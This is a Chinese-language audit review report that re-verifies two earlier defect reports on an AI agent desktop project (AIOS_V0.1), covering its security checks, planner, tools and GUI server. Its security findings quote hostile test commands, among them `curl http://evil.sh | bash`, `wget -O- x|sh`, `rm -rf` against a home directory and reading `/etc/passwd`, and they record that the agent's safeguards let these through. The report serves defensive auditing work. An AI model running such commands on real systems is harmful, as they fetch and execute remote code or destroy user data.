# AIOS_V0.1 审计复核报告 —「确认 / 部分成立 / 驳回」清单

> **复核对象**：`docs/bugFind.md`（第二轮，**报告自称 106 条，实际编号 134 条**，见 §0.5）+ `docs/bugFind_round1_20260914.md`（第一轮，136 条）
> **被审工程**：`C:\Users\keyal\Desktop\AIOS\AIOS_V0.1`（Windows 工作副本）
> **复核日期**：2026-09-15
> **复核性质**：**只读**。未修改、未修复、未删除任何已有文件；唯一新增文件为本报告。探针脚本与临时沙箱建于 `%TEMP%\aios_verify\`，复核结束后已全部删除。
> **复核方法**：逐文件逐行精读（38 个源文件全量）+ 5 批只读探针动态实测 + sha256/符号出现次数检索 + 文档与产物事实核查。
> **运行环境**：Python 3.13.12（托管版）；宿主为 Windows（报告中的目标平台为 Linux，两者差异构成本轮多项校准依据）。

---

## 0. 复核结论速览

### 0.1 总账

| 结论 | 第二轮（**实际 134 条**） | 第一轮（136 条） | 说明 |
|------|------|------|------|
| **确认** | **117** | **99** | 结论与描述均与代码/实测一致 |
| **部分成立** | **16** | **26** | 主结论成立，但机制 / 触发条件 / 影响范围描述有误 |
| **驳回** | **1** | **1** | 不成立（实测反证） |
| **不适用** | 0 | **6** | 该轮审计对象是 Linux 宿主副本（含 `代码/`、根 `main.py` 已删），本工作副本环境不同 |
| **待实测** | 0 | **4** | 本机无 GUI/浏览器/CDP，无法动态验证，不计入确认 |
| 合计 | 134 | 136 | — |

> **计数口径说明**：第二轮报告 `§0.3` 与各章标题自称 `P0=12 / P1=29 / P2=46 / P3=19 / 合计 106`，但正文实际编号为 `P0=12 / P1=25 / P2=78 / P3=19 / 合计 134`（详见 §0.5）。本复核对**正文实际存在的 134 条**逐条复核。

### 0.2 严重度校准（需下调的条目）

| 原编号 | 原级 | 校准后 | 理由（实测） |
|--------|------|--------|--------------|
| 二轮 P0-06 | P0 | **P1** | `os.system` 拼接属实，但 `shutil.which(desktop)` 前置校验使**命令注入不具备可达性**（含元字符的串 `which` 返回 None）；真实成立的是"不校验返回码 → 谎报已启动" |
| 二轮 P2-14 | P2 | **P3** | `suspects` 只取 `len(g) > 1` 的分组，"把只出现一次的同尺寸文件也算 MD5"这半句**不成立**；剩"`by_size` 无上限"属内存健壮性 |
| 二轮 P2-15 | P2 | **P3** | Python 3.13 下 `rglob("/etc/*")` 实测抛 `NotImplementedError`（被拒），**不越界**；仅剩 `count(≤100)` 与 `files(≤50)` 口径不一致 |
| 二轮 P2-32 | P2 | **P3** | "以 `/` 结尾 → basename 为空"**不成立**（代码已 `rstrip("/\\")`）；仅根路径 `"/"` 成立，且规则路径下该分支不可达 |
| 二轮 P2-49 | P2 | **P3** | 实测未知 action 返回 `simulated: True`（`not _REAL`），与报告写的 `simulated=False` **相反**，"用 simulated 表达失败"是误读 |
| 二轮 P2-57 | P2 | **P2（修正表述）** | `_persist` 确缺失（实测产物目录仅 `a.jsonl`）；但"也不 `audit()`"**不成立**——`security_check` 审计在成功路径同样落盘 |
| 二轮 P2-75 | P2 | **P3** | 聊天路径用 `staged.token`（局部变量），与控制台 `PIPE_TOKEN` **未共用**，"确认令牌串用"不成立；真实问题是 `CURSOR/RUN_ID/BUNDLE` 全局态共用 |
| 二轮 P3-13 | P3 | **驳回** | 实测 `sys.path.insert(0, ROOT); import group_1` → OK；仅"绕过包机制直接 `import host_agent`"才失败。正常包导入不受影响 |
| 二轮 P2-05 | P2 | **P3** | 实现已同时返回 `count`（扫描总数）与 `returned`（本页条数），命名歧义已被缓解 |
| 一轮 B-008 | P0 | **P2** | 与二轮 P2-77 同源；点击"已拦截"运行确实必抛 `TypeError`，但影响仅限前端渲染，无数据破坏 |
| 一轮 B-131 | P3 | **驳回** | `hnu_intro.md` 实测 **167 字节**（非 0 字节），内容是工具结果 repr |
| 一轮 B-042 / B-063 | P1 / P2 | **P3** | 跨平台保护错位、`os.makedirs("C:\\", exist_ok=True)` 在 Windows 上均**无实际后果**（无 `/etc`；根目录已存在） |

### 0.3 被两轮报告漏掉的、本轮复核新增的成立缺陷

| 新编号 | 位置 | 问题 | 建议级别 |
|--------|------|------|----------|
| **V-01** | `group_3/automator.py:211-221` | `_resolve_desktop` **缺长度护栏**：实测 `_resolve_desktop("我的文件报告")` → `"nautilus"`（子串 `"文件"` 命中），而同名逻辑在 `group_2/task_planner._known_app_name` 已加护栏并返回 `None`。**组3 未同步组2 的修复** → "点击我的文件报告"会被路由成启动文件管理器。**（第一轮 B-020 已记录，第二轮漏收且未列入 §6.4）** | **P1** |
| **V-02** | `src/real_tools.py:199` | 实测 `send_email(to="a@b.com", body=None)` → `TypeError: object of type 'NoneType' has no len()`（干跑分支即崩，异常穿出工具函数）。**（第一轮 B-059 已记录，第二轮漏收）** | P2 |
| **V-03** | `src/skill_library.py:302/348`、`_organize_downloads:188` | 实测字符串数值直接崩：`_cleanup_temp(max_age_days="1")` → `TypeError`、`_find_large_files(min_size_mb="0")` → `TypeError`、`_organize_downloads(workers="2")` → `TypeError`。**注**：GUI 表单已做数字归一，故触发面为直调 / LLM 传串 | P3 |
| **V-04** | 项目根 | 额外运行产物 `._backup.zip`、`.baseline_test.txt`（两轮卫生清单均未列入） | P3 |
| **V-05** | 两轮报告 §7 | 文档定位错误：所谓 `docs/testing.md` 在本工程**不存在**，实际文件是 `.agents/skills/agent-os-dev/references/testing.md`（内容确列 8 个测试文件、127 用例）——**结论成立、路径需修正** | P3 |

### 0.4 误报成因归纳（供后续审计参考）

1. **跨平台假设混用**：报告在 Windows 副本上写成 Linux 语义结论（P0-05 的"删除整个工作区"链条被 Windows 路径判据恰好掐断；P1-13 的"步骤被 drop"实为"静默用错默认目录"）。
2. **读代码时跳过前置守卫**：`shutil.which` 先于 `os.system`（P0-06）、`p.is_file()` 先于 `p.stat()`（一轮 B-047）、`rstrip("/\\")` 先于 `basename`（P2-32）、`is_file()` 先于受保护路径判定（`read_file`）。
3. **对布尔/取反表达式的误读**：`simulated: not _REAL` 被读成 `simulated=False`（P2-49）。
4. **把"调用点存在"当成"共用状态"**：P2-75 的令牌串用。
5. **宿主/版本相关的行为未实测**：`Path.rglob` 在 3.13 已禁止绝对 pattern（P2-15）。
6. **数值快照漂移**：`audit_log.jsonl` 报告 555 行 / 实测 561 行；`rag_traces.jsonl` 225 / 228；`tests/.tmp_*` 48 / 49；`saveChatHistory` 调用点行号 688 / 689。

---

### 0.5 第二轮报告自身的统计错误（复核中新发现）

`docs/bugFind.md` 的**正文编号与它自己的统计表/章标题不一致**，实测：

| 级别 | 报告自称 | 正文实际编号 | 差异 |
|------|----------|--------------|------|
| P0 | 12 | 12（`P0-01`…`P0-12`） | ✅ 一致 |
| P1 | 29 | **25**（`P1-01`…`P1-25`） | **缺 `P1-26`…`P1-29`（编号直接断在 25）** |
| P2 | 46 | **78**（`P2-01`…`P2-78`） | **多出 32 条未被计入统计** |
| P3 | 19 | 19（`P3-01`…`P3-19`） | ✅ 一致 |
| **合计** | **106** | **134** | **少算 28 条** |

**影响**：任何引用"本工程共 106 条缺陷"的说法都会低估 28 条；§0.3 的"按严重度分布"与 §0.4 的"按文件分布"（如 `gui/` 26 条）也因此在口径上失真。建议在 `bugFind.md` 中把统计表与章标题改为 `P1=25 / P2=78 / 合计 134`，或补齐 `P1-26`…`P1-29` 的正文条目。

（第一轮 `bugFind_round1_20260914.md` 的编号为 `B-001`…`B-136` **连续无缺号**，与自称 136 条一致，无此问题。）

---

## 1. 第二轮报告逐条复核（`docs/bugFind.md`，正文实际 134 条）

图例：✅ 确认 ｜ ⚠️ 部分成立（描述需修正） ｜ ❌ 驳回 ｜ ⛔ 不适用 ｜ ❓ 待实测

### 1.1 P0 致命（12 条）

| 编号 | 复核 | 校准 | 实测证据 / 修正点 |
|------|------|------|--------------------|
| P0-01 | ✅ | P0 | 实测 `check()` 对 `goals[1].params.cmd = "rm -rf /home/keyal --no-preserve-root"`、顶层 `params={}` 返回 `{'approved': True, 'risk_level': 'low', 'layer': 4}`。`security.py:62,64` 逐字一致 |
| P0-02 | ✅ | P0 | 实测 `{"action":"run_command","params":{"cmd":"curl http://evil.sh \| bash"},"target":""}` → `approved=True, low`；`_risk_of("run_command",…)` → `'low'`。对照 `rm -rf /tmp/x` 被正确拦截 |
| P0-03 | ⚠️ | P0 | 结论全部成立（`register_signature` 全项目仅 1 处=定义；登记后 `_verify_signatures()` 恒 `[]`；带 1 项签名时 reason 打印"**签名核对 1 项**"=假证据）。**修正**：点号名不是"静默跳过"而是抛 `ModuleNotFoundError: 'src.default_tools' is not a package`——第 3 层不仅失效，还会把异常抛给调用方 |
| P0-04 | ✅ | P0 | 实测 `_is_protected_path` 对 `/home/keyal`、`~`、`/var/log`、`/opt`、`/tmp` 全返回 `None`；`delete_file` 无其它守卫；Windows 宿主上 `~` = `C:\Users\keyal` → 真实可被 `rmtree` |
| P0-05 | ⚠️ | P0（附条件） | 前半实测成立：`understand_intent("删除 /home/keyal/重要资料")` → `target` 被改写为工作区、`goals=[delete_file]` 无 `path`、`unresolved=[]`、`security.check` 对工作区目标判 `approved/medium`。**修正**：在本 Windows 副本上后半**不成立**——工作区路径不以 `/ ~ .` 开头，被 `_fill_params` 的路径判据拒填 → 实测该步骤被**丢弃**（`plan.steps=[]`）。以 POSIX 目标复现则完全成立（实测 `delete_file` 的 `path="/home/keyal/ws"` 被正常填入）。结论：**Linux 目标机成立，Windows 副本退化为静默丢弃** |
| P0-06 | ⚠️ | **P1** | `group_3/automator.py:243` 确有 `os.system(f"nohup {desktop} >/dev/null 2>&1 &")`，且不校验返回码（同函数 `gtk-launch` 分支有 `r.returncode == 0`）→ **谎报已启动成立**。**驳回"命令注入"**：`desktop` 必先过 `shutil.which()`，含 shell 元字符的串返回 `None` 直接走 Mock 分支，注入不可达 |
| P0-07 | ✅ | P0 | `app_agent.py:55` 逐字一致；`main.py:82` 与 `gui/server.py:59` 均未注入 confirmer；`SETTINGS_DEFAULT["escalation_confirm"]="auto"`（`server.py:71`） |
| P0-08 | ✅ | P0 | `_body()` 实测仅读 `Content-Length`（源码片段逐字核对）→ 无 Content-Type / Origin / Referer / token；POST 路由（`/api/call`、`/api/orchestrate`、`/api/settings`、`/api/llm_config`、`/api/smtp_save`）均无来源校验。**补充限定**：新版 Chrome 的 Private Network Access 预检对"公网页 → localhost"有部分拦截，属缓解不是修复（本地/内网页面、旧内核浏览器仍可打） |
| P0-09 | ✅ | P0 | `confirm_mode="auto"` 全文件实测 2 处：`/api/orchestrate`（483 行，兼容路由一步到底）+ `_start_run` 默认形参 |
| P0-10 | ✅ | P0 | 实测 5 个 `web_*` 在浏览器不可用时 `success` 全为 `True`；`tests/test_integration_v10.py::test_web_tools_mock_degrade` 逐字断言 `assertTrue(r["success"])` + `assertTrue(r.get("simulated"))` → 缺陷被固化为契约 |
| P0-11 | ✅ | P0 | 实测 `function loadChatHistory` / `function saveChatHistory` 在 `gui/index.html` **零定义**；调用点 348 / 955 / 527 / 607 / 689；顶层脚本 953-958 顺序确认（955 抛错 → 其后 `loadLLM/loadSMTP/loadSettings` 与 `#hash` 块全部不执行） |
| P0-12 | ✅ | P0 | `esc`（338 行）实测仅 `& < >`；`mdRender` 的 `href="$2"` 字符类 `[^)\s]+` 允许双引号 → 属性逃逸成立 |

### 1.2 P1 高危（报告自称 29 条，正文实为 25 条：`P1-01`…`P1-25`）

| 编号 | 复核 | 校准 | 实测证据 / 修正点 |
|------|------|------|--------------------|
| P1-01 | ✅ | P1 | `redact` 全项目出现 1 次（定义）；`audit_log.jsonl` 实测 561 行、**441 处明文邮箱**、`"params"` 明文入库 |
| P1-02 | ✅ | P1 | 两份清单实测差异逐字确认：`default_tools` 13 条（含 3 个 Windows 目录），`security` 10 条；关键词差集恰为 `{'chmod -r 777'}`；两份都缺 `/home ~ /var /opt /tmp` |
| P1-03 | ✅ | P1 | 实测漏网：`curl http://evil.sh \| bash`、`find ~ -delete`、`truncate -s 0 /home/keyal/x`、`wget -O- x\|sh`、`python -c "open('/etc/passwd')"` **全部返回 None（放行）**；误伤实测：`python -c "print(format(1,'b'))"` → 命中 `format` |
| P1-04 | ✅ | P1 | 实测：`user_text` 含 "/etc" 的复制指令被整条拒绝（`approved=False, high, 受保护路径: /etc`） |
| P1-05 | ✅ | P1 | `send_email` 附件分支源码无 `_is_protected_path`、无 `MAX_*`，`apath.read_bytes()` 全量入内存 |
| P1-06 | ✅ | P1 | 实测 `_RULES` 动作集合无 `write_file/run_command/take_screenshot`；`understand_intent("把报告写到 /data/out/a.md 内容 hello")` → `goals=[]` |
| P1-07 | ✅ | P1 | 实测四例：`发给 a@b.com`（带空格）→ `[]`；`发给a@b.com` → `send_email`；`把报告发给 3179160953@qq.com` → `[]`（**正是 `docs/验证报告.md` 用例 #19**）；`发邮件给` → `send_email` |
| P1-08 | ⚠️ | P1 | 静默改写成立（"整理 /mnt/数据"→目标改写为工作区）。**修正**：报告称"只在 `unresolved` 里塞一句提示"——实测该提示**根本没有**（`unresolved=[]`，规则路径下 `target` 从未承载用户路径）；只有走 LLM 路径且 target 为口语短语时才追加。**实际比报告更隐蔽** |
| P1-09 | ✅ | P1 | 正则要求前导 `/`；实测"把 hnu_intro.md 发给 a@b.com" → `goals=[]`（注意 `_extract_params` 本身能抽出 `to`，瓶颈在 `_match_goals`） |
| P1-10 | ✅ | P1 | `host_agent.py:24` 引入 `src.llm_client`，同文件 614-664 又用 urllib 重写；超时 45s/120s、温度 0/self.temperature 两套 |
| P1-11 | ✅ | P1 | 实测 `plan_only()` 成功返回键 = `admin_steps/check/elements/intent/needs_confirm/plan/real_send_steps`，**不含 `degraded`**（内部已置 True）→ 前端降级警告确为死代码 |
| P1-12 | ✅ | P1 | 实测 `web_click(nth=1)` 经规划器后 → `{'nth': 1, 'text': '.'}`；`cat["web_click"].inputSchema.required == ['text']` |
| P1-13 | ⚠️ | P1 | 判据实测成立（`not startswith(("/","~","."))`）；**修正"所有文件类动作……步骤被 drop"过宽**：实测 `organize_downloads` 取到 `params={}` → **静默改用默认 `~/Downloads`（错目录，不报错）**；`backup_directory` 由专用分支补齐 `src/dest`（正常）；只有"必填路径参数且无专用分支"（如 `delete_file`）才被丢弃 |
| P1-14 | ✅ | P1 | sha256 实测**逐字吻合**：根 `host_agent` `ad79bd618eaf38c9`(403 行，无 `_finalize_intent`/`repair_intent`/`detect_operation`)、根 `task_planner` == `group_1/task_planner` == `b1a6976b082c4a43`(248 行，无 `route_policy`/`click_element`/`last_file_target`)、`group_1/host_agent` `433d18d822dd9e48`、在用 `group_2/task_planner` `5f9c881e572c4890`。且根两副本**零绝对导入点**（全项目 `import task_planner` / `import host_agent` 均无命中） |
| P1-15 | ✅ | P1 | 实测 `_risk_of("run_command",…)` → `'low'`；规划器收尾步骤仅给 `cmd`（`task_planner.py:92-95`），从不设 `sandbox` |
| P1-16 | ✅ | P1 | 实测 `confirm_mode="deny"` 时 `session.escalations == [{'user_confirmed': False}]`；前端 479 行无条件渲染"被拒 → **已确认** → ADMIN 重试" |
| P1-17 | ✅ | P1 | 实测 deny 模式仍执行 2 步（含 `requires_admin` 的 `run_command`），该步失败 → `verdict=FAIL`；`plan.steps` 未做任何过滤 |
| P1-18 | ✅ | P1 | `el2 == el` dict 相等（237 行）与 `ctx[max(ctx)]`（194 行）逐字一致；上一步失败时不进 `ref_ctx` → 静默取更早结果 |
| P1-19 | ✅ | P1 | `task_planner.py:81-84` 仅在 `steps[-1]["kind"] == "skill"` 时更新 `last_file_target` |
| P1-20 | ✅ | P1 | 实测 `ControlDetector().backend == 'mock'`；`_simulated_elements()` 返回 4 条元素，每条约只有 `role/name/bbox`（缺 `app`/`depth`）；`find_element(name="不存在的控件")` → `None`。宿主无 pyatspi/atspi-gi，判定成立 |
| P1-21 | ✅ | P1 | 实测 `self.path.startswith("/api/run")` 出现 **3 次**（GET 1 + POST 2）；`# /api/call…` 注释（597 行）挂在 `/api/chat_save` 分支（598 行）上方，真正的 `/api/call` 在 611 行 |
| P1-22 | ✅ | P1 | `do_GET` 全函数无 `try`（源码区段实测）；`int()` 出现在 `/api/rag`(330) 与 `/api/run`(377) |
| P1-23 | ✅ | P1 | `/api/reset_stats` 实测仅 `os.remove(STATS_PATH)`，未调用已存在的 `stats.clear()`（`src/stats.py:96-100`） |
| P1-24 | ✅ | P1 | **实测逐项吻合**：`llm_config.json` 167 B、`api_key` 长度 **49**、前缀 `sk_t` 明文；`smtp_config.json` 125 B、`SMTP_PASS` 长度 **16** 明文；掩码泄露（346/371）；`load_smtp_config()` 把凭据灌进 `os.environ`（实测函数体逐字一致） |
| P1-25 | ✅ | P1 | 实测淘汰代码 `sorted(RUNS)[:len(RUNS)-50]` 与 `rid = uuid.uuid4().hex[:8]`（随机 hex，字典序与时间无关） |

### 1.3 P2 中危（46 条）

| 编号 | 复核 | 校准 | 要点 |
|------|------|------|------|
| P2-01 | ✅ | P2 | `create_folder` 无受保护路径判定；实测可递归创建任意临时层级 |
| P2-02 | ⚠️ | P2 | 不 `resolve()` 后写、非原子、无大小上限均成立；**"无 `..` 穿越防护"驳回**——候选集含 `Path(path).resolve()` 结果，Linux 上 `/tmp/../etc/passwd` 会被解析后命中保护（`write_file("/etc/passwd")` 实测被拒：`受保护路径: /etc`） |
| P2-03 | ✅ | P2 | `shell=True` + 字符串拼接；`sandbox=True` 而 bwrap 缺失时仅在输出前缀注明 |
| P2-04 | ✅ | P2 | `SAFE_COMMANDS` 全项目出现 1 次（定义），零引用 |
| P2-05 | ⚠️ | **P3** | 实测返回 `count=4, returned=2` —— 已同时给出扫描总数与本页条数，"字段名易误读"已被缓解；`limit` 上限 1000 硬编码成立 |
| P2-06 | ⚠️ | P2 | `msg` 构建两次（159-162 / 176-181）成立；"`sender` 在 env 替换前取值"影响≈0（同值），该子项降 P3 |
| P2-07 | ✅ | P2 | `int(port or os.environ.get("SMTP_PORT", 465))` 无保护且在 `try` 之外 |
| P2-08 | ✅ | P2 | 实测 `_norm_recipients(["a@b.com","bad-addr"])` → `[]`；错误信息回显完整 `to` |
| P2-09 | ✅ | P2 | `take_screenshot` 无隐私提示、`path` 无受保护校验、固定 `time.sleep(2)` |
| P2-10 | ✅ | P2 | 仅 scheme 前缀校验；实测 `open_url(url, new=999)` 直接透传（无钳位） |
| P2-11 | ✅ | P2 | 实测 `def call_skill` 出现 **2 次**（59、62 行），第一份仅一行赋值 |
| P2-12 | ✅ | P2 | `_organize_downloads` 有 `errors` 仍 `success=True`；`_cleanup_temp` 同 |
| P2-13 | ✅ | P2 | `f.unlink()` 直删（无回收站/备份），仅单层 `iterdir` |
| P2-14 | ⚠️ | **P3** | `suspects = [f for g in by_size.values() if len(g) > 1 for f in g]` —— **只取 size 撞车组**，"把只出现一次的同尺寸文件也算 MD5"不成立；剩 `by_size` 无上限（内存健壮性） |
| P2-15 | ⚠️ | **P3** | 实测 `Path.rglob("/etc/*")` → `NotImplementedError: Non-relative patterns are unsupported`（Python 3.13，被拒绝而非越界）；`count(≤100)` vs `files(≤50)` 口径不一致、截断不告知成立 |
| P2-16 | ✅ | P2 | 预检查只判 `required` 是否存在，不校验类型/枚举/范围 |
| P2-17 | ✅ | P2 | `{"success": True}` 无 `result` 仍写入 `"result": None`（实测 `ToolResult(success=True,result=None).to_dict()`）；真值非 bool 时 `bool()` 强转 |
| P2-18 | ✅ | P2 | 实测：连续 2 笔 `record()` 后文件内 `records` 从 1 变 2（每笔全量重写）；`BufferedToolStats` 全项目仅出现在自身+`src/__init__.py` 导出 |
| P2-19 | ✅ | P2 | 注释实测位于 `else:`（失败计数）分支体内 |
| P2-20 | ✅ | P2 | `record()` 无锁；`BufferedToolStats`（带锁）未启用 |
| P2-21 | ✅ | P2 | 去重判据 `title in [l.split(" ",1)[-1] for l in lines]` 恒不成立（lines 元素为 `"• 标题\n  url"`） |
| P2-22 | ✅ | P2 | `mock_jsonrpc_call` 用 `registry.has(name)` 区分错误码 → 权限不足被误报 `-32603`；不校验 `jsonrpc`/`id` 回带 |
| P2-23 | ✅ | P2 | `register_mock_tools` 每次覆写 `mock-server.tools_count = 3` |
| P2-24 | ✅ | P2 | 可变默认参数 `_id: list[int] = [0]` 跨实例共享；且比较时**重读** `_id[0]`（并发下应答被丢弃 → 双等 15s 超时）成立 |
| P2-25 | ✅ | **P3** | pong 长度编码 `bytes([0x8A, len(chunk)])` >=126 时非法、握手不校验 `Sec-WebSocket-Accept` 均成立，但 CDP 控制帧极短 → 影响低 |
| P2-26 | ✅ | P2 | `_ensure_locked(url)` 的 `url` 形参全函数未使用 |
| P2-27 | ✅ | P2 | `open_url` 中 `except CDPError: raise` + 紧随 `except Exception: pass` 逐字一致 |
| P2-28 | ✅ | P2 | 实测二次调用：`register_web_tools` → `ValueError: 工具 'web_search' 已注册`；`register_real_tools` → `ValueError: 工具 'open_url' 已注册`；三套幂等口径成立 |
| P2-29 | ✅ | P2 | `tool_param_type` 无 `integer`；`to_dict()` 把 `default` 只写进 `properties`（不参与 `required`） |
| P2-30 | ✅ | P2 | `_results` 无上限、`drain()` 不重置、`shutdown()` 在队列满时阻塞、全项目未接线（仅 `src/__init__.py` 导出） |
| P2-31 | ✅ | P2 | 实测"先整理 A 再整理 B" → 只产出 1 个 `organize`（第二条目标静默丢失） |
| P2-32 | ⚠️ | **P3** | `"" in user_input` 恒真成立，但**仅在 `r == "/"`（或空）时**触发；代码已 `rstrip("/\\")`，"以 `/` 结尾"不成立；且规则路径下该分支不可达（实测"整理 /"落回工作区） |
| P2-33 | ✅ | P2 | 保守门 `len(text) > 60` 与"只看 goals 数量 ≤2、不查是否含 write_file/run_command"逐字一致 |
| P2-34 | ⚠️ | P2 | 实测 `default_target.rstrip("/") + "/"` 在 Windows（含 `\`）恒不匹配 → 条件恒真。**修正方向**：不是"防线失效"而是"**过度收紧**"——工作区内的正常子路径也会被压回根目录 |
| P2-35 | ✅ | P2 | 实测 `"说明:\n```json\n{...}\n```\n结束"` 经该正则后变为 `"说明:\n\n{...}\n\n结束"`（行首 ``` 被剥） |
| P2-36 | ✅ | P2 | `_CATEGORIES` 含 `search`/`web_*`/`answer`，而 `_RULES` 不再产出 `search` |
| P2-37 | ✅ | P2 | `ai_shell.handle()` 的 `ok` 统计吞掉 `simulated` 语义；`_show_history` 对 bundle 分支只打印"…步" |
| P2-38 | ✅ | P2 | 实测 create_folder 步骤序列 `open_app → wait → hotkey(ctrl+shift+n) → type → hotkey(enter)`，无焦点校验 |
| P2-39 | ✅ | P2 | 实测 `_known_app_name("zcode") → 'code'`（`"code" in "zcode"` 且长度护栏 `5 <= 5` 通过）；两表差异（group_2 无 zcode）确认 |
| P2-40 | ✅ | P2 | `_elements_for` 仅收 `params.element`，`element_query` 形式不进 `elements{}` |
| P2-41 | ✅ | P2 | 实测在用规划器 `plan()` 含 `routes` 键；根/`group_1` 副本源码中无 `routes`、无 `route_policy` → 副本产出缺该字段 |
| P2-42 | ✅ | P2 | 实测 `_required_ok("mcp_search", {}, None)` → `True`（无 schema 即无条件放行改写） |
| P2-43 | ✅ | P2 | `consumed_by` 把 `prev_result` 固定映射到 `steps[idx-1]`；补充实测：route_policy 会用 `target` 参与改写（`apply_route_policy` 对 `search`+无消费 → 改 `web_search`） |
| P2-44 | ✅ | P2 | 实测 `_looks_like_url`：`1.5`→True、`a.b`→True、`file.txt`→True、`www.baidu.com`→True、`长沙天气`→False；正则对嵌套 `{{}}` 的缺陷成立 |
| P2-45 | ✅ | P2 | `stack.append(self._child(obj, j))` 无 `None` 保护，异常被逐节点 `except` 吞掉 |
| P2-46 | ✅ | P2 | `find_element` 每次 retry 触发全量 `detect_elements()`；`refresh()` 是清空而非失效重建 |
| P2-47 | ✅ | P2 | 实测 `try_call_with_selfheal` 全项目出现 1 次（定义）→ 死代码 |
| P2-48 | ✅ | P2 | 解析顺序 `params.element → elements[target] → element_query`，键不匹配时静默降级 |
| P2-49 | ⚠️ | **P3** | 未知 action 实测返回 `{'success': False, 'error': '未知操作: nonexistent', …, 'simulated': True}` —— 报告写的 `simulated=False` **相反**；"用 simulated 表达失败"是误读，该字段实际表达 `not _REAL` |
| P2-50 | ✅ | P2 | `navigate` 在未验证时 `os.makedirs(path, exist_ok=True)`（把"打开"扩成"创建"），失败静默穿过 |
| P2-51 | ✅ | P2 | `capture_state()` 用 `os.listdir(".")`。**实测副作用证据**：在某临时 CWD 下 before/after 均为浏览器临时文件列表（`.ses`、`*.tmp`、`*.png`…），与用户工作区无关 |
| P2-52 | ✅ | P2 | `hotkey` 用 `if k.lower() in _KEYCODE` 过滤，未知键静默丢弃；全未知时空转但仍按成功返回 |
| P2-53 | ✅ | P2 | `type_text` 非 ASCII 直接 `_KSYM_SPECIAL.get(ch, ch)`（中文当 keysym） |
| P2-54 | ✅ | P2 | `window_names()` 硬截断 `[:20]` |
| P2-55 | ✅ | P2 | `_TOL_PX=4.0/_TOL_SCALE=0.03`；模块级 `_cache_ts/_cache_wins` 无锁、失败结果同样缓存 0.5s |
| P2-56 | ✅ | P2 | `FileManagerAgent.navigate_to/create_folder` 只发一条快捷键；无调用点 |
| P2-57 | ⚠️ | P2 | `_persist` 缺失成立（实测 `plan_only` 成功后产物目录只有 `a.jsonl`，无 intent/plan/check.json）；**"也不 audit()"不成立**——`security_check` 审计在成功路径同样落盘 |
| P2-58 | ✅ | P2 | 两处 verdict 表达式差异逐字确认；实测 `execute_approved` 在 `total==0` 时返回 PASS |
| P2-59 | ✅ | P2 | `_consistent` 只对账"组3 自报 summary vs 组3 自己 steps"，无独立证据源 |
| P2-60 | ✅ | P2 | 反思重试覆盖 `bundle["intent"/"plan"/"session"/"results"]`，首轮失败明细仅剩 `reflected.fixed_goals` |
| P2-61 | ✅ | P2 | `_persist` 写 5 个固定文件名（无 run id / 时间戳） |
| P2-62 | ✅ | P2 | `self.security or SecuritySandboxStub()` 在 70/184/227 三处各自兜底 |
| P2-63 | ✅ | P2 | `query()` 每次全量 `_tokenize`；`_load()` 一次性读入内存（现 228 行）；无锁无上限 |
| P2-64 | ✅ | P2 | `rag._append` 与 `coordinator.audit()` 的 open/write 均无 `try/except` |
| P2-65 | ✅ | P2 | `_emit` 在 `RUNS_LOCK` 外追加；`RUNS.get(rid)` 在锁外 |
| P2-66 | ✅ | P2 | `rag_k` 存在于默认设置但 `apply_settings` 不消费，`/api/rag` 只取 query 参数 → 死旋钮 |
| P2-67 | ✅ | P2 | **实测吻合**：`system_out/settings.json` 的 `workspace` = `/home/keyal/AIOS工作区`；`apply_settings` 直接 `os.makedirs(ws)` → Windows 上会建出 `C:\home\keyal\AIOS工作区` |
| P2-68 | ✅ | P2 | `run["events"]` 无上限；`RUNS` 保留完整 bundle；`PENDING` 无过期/容量上限 |
| P2-69 | ✅ | P2 | `/api/controls` 在 `with _LOCK:` **内部**做全桌面遍历 |
| P2-70 | ✅ | P2 | `_body()` 无非数字/超长保护 |
| P2-71 | ✅ | P2 | `bundle["stats_detail"] = stats_payload()` 在 `with _LOCK` 之外执行 |
| P2-72 | ✅ | P2 | worker 异常只写 `run["error"]`，不落审计日志 |
| P2-73 | ✅ | P2 | `pollRun` 实测：`CURSOR=d.cursor; d.events.forEach(...)` 未防 404 体（`{error,rid,existing}`） |
| P2-74 | ✅ | P2 | 604-606 行 `filter(x=>x.name==="llm_answer").pop().tool_result.result.answer` 取"最后一个"而非"有 answer 的那个" |
| P2-75 | ⚠️ | **P3** | 聊天路径（561-567）用 `staged.token` 局部变量，编排路径（383/406）用全局 `PIPE_TOKEN` → **两条入口未共用令牌**，"令牌串用"不成立；真实问题是 `CURSOR/RUN_ID/BUNDLE` 全局态共用（两入口并发时互相覆盖） |
| P2-76 | ✅ | P2 | `renderForm` 只生成 `<input>`（753-757），ARRAY 参数无法多值；`data-t="boolean"` 用 `!(v.toLowerCase() in {...})` 反查 |
| P2-77 | ✅ | P2 | `renderBundle` 无守卫直接读 `BUNDLE.session.steps`（469 行）；`loadRun` 仅判 `!d.bundle`（519 行）→ 点击"已拦截"运行必抛 `TypeError`（与一轮 B-008 同源，**此级 P2 比一轮的 P0 更贴切**） |
| P2-78 | ✅ | P2 | 432 行 `const escSteps=new Set(...)` 声明后从未使用 |

### 1.4 P3 低危 / 卫生（19 条）

| 编号 | 复核 | 校准 | 要点 |
|------|------|------|------|
| P3-01 | ✅ | P3 | `add_protected` 的 `return` 之后存在不可达 `self.signatures = {}` |
| P3-02 | ⚠️ | P3 | 无源码对象确实抛异常且未捕获，**但异常类型是 `TypeError`**（实测 `register_signature("len", len)` → `TypeError: … got builtin_function_or_method`），非报告所写 `OSError` |
| P3-03 | ✅ | P3 | `SYSTEM = build_system() if False else SYSTEM`（247 行） |
| P3-04 | ✅ | P3 | 注释（597）与分支（611）错位 |
| P3-05 | ✅ | P3 | `ThreadingHTTPServer` 未设 `protocol_version`（默认 HTTP/1.0） |
| P3-06 | ✅ | P3 | 实测 `function showPipeJson` 出现在 **484 与 491** 两行，内容相同 |
| P3-07 | ✅ | P3 | `_flowTo` 全文件仅 1 处（定义），从未调用 |
| P3-08 | ✅ | P3 | 938 行实测 `$("#page-settings")&&0; /* 占位 */` |
| P3-09 | ✅ | P3 | 实测 `<style>` 块内确实缺 7 个类：`field/tip/req/hl/bar-row/bar-track/bar-fill`；另实测还缺 `.toolbar`（222 行 `div`，非报告所写 `table`）与 `.item.on`（736 行选中态） |
| P3-10 | ✅ | P3 | 注释被缩进到 `re.findall(...)` 调用内部（73 行） |
| P3-11 | ✅ | P3 | 59-61 行残留（首份 `call_skill` 仅一行赋值） |
| P3-12 | ✅ | P3 | `_BROWSER_CANDIDATES` 全 Linux 路径；`_PROFILE_DIR` 硬编码 `~/.local/share/agent_os/...` |
